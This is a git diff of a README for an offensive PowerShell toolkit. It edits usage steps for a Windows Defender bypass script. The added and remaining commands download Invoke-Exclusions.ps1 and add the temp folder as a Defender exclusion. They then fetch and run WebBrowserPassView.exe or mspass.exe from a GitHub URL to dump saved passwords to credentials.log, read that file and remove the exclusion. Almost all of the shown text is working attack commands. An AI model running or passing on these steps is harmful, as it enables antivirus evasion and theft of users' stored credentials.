@@ -121,14 +121,6 @@ Warning: Invoke-Exclusions will 'NOT' delete itself or ChromePass.exe (deliver b
 
 <br />
 
-**downloadcmdLet:**
-```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1" -OutFile "Invoke-Exclusions.ps1"
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/WebBrowserPassView.exe" -OutFile "WebBrowserPassView.exe"
-```
-
-<br />
-
 **prerequesites checks:**
 ```powershell
 #Make sure Windows Defender service its running
@@ -147,7 +139,10 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-B
 
 **execute:**
 ```powershell
-#Get Exclusions List
+#Download Invoke-Exclusions cmdlet
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1" -OutFile "Invoke-Exclusions.ps1"
+
+#Get Exclusions List (optional)
 .\Invoke-Exclusions.ps1 -action "query"
 
 ## Add exclusion Path + Download URI PE + Execute PE
@@ -156,11 +151,11 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-B
 # 3º - cd $Env:TMP; .\ChromePass.exe /stext credentials.log
 .\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/WebBrowserPassView.exe" -Arguments "/stext credentials.log"
 
+#Read logfile
+Get-Content -Path "$Env:TMP\credentials.log"
+
 #Remove ExclusionPath "$Env:TMP" from Windows Defender list
 .\Invoke-Exclusions.ps1 -action "del" -type "ExclusionPath" -Exclude "$Env:TMP"
-
-# Execute WebBrowserPassView
-.\WebBrowserPassView.exe
 ```
 
 <br />
@@ -184,14 +179,6 @@ Warning: Invoke-Exclusions will 'NOT' delete itself or WebBrowserPassView.exe (d
 
 <br />
 
-**downloadcmdLet:**
-```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1" -OutFile "Invoke-Exclusions.ps1"
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/mspass.exe" -OutFile "mspass.exe"
-```
-
-<br />
-
 **prerequesites checks:**
 ```powershell
 #Make sure Windows Defender service its running
@@ -210,20 +197,24 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-B
 
 **execute:**
 ```powershell
-#Get Exclusions List
+
+#Download Invoke-Exclusions cmdlet
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1" -OutFile "Invoke-Exclusions.ps1"
+
+#Get Exclusions List (optional)
 .\Invoke-Exclusions.ps1 -action "query"
 
-## Add exclusion Path + Download URI PE + Execute PE
+## Add exclusion Path to Download URI PE + Execute PE
 # 1º - Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
 # 2º - Iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/mspass.exe" -OutFile "$Env:TMP\mspass.exe"
 # 3º - cd $Env:TMP; .\ChromePass.exe /stext credentials.log
 .\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/mspass.exe" -Arguments "/stext credentials.log"
 
+#Read logfile
+Get-Content -Path "$Env:TMP\credentials.log"
+
 #Remove ExclusionPath "$Env:TMP" from Windows Defender list
 .\Invoke-Exclusions.ps1 -action "del" -type "ExclusionPath" -Exclude "$Env:TMP"
-
-# Execute mspass
-.\mspass.exe
 ```
 
 <br />
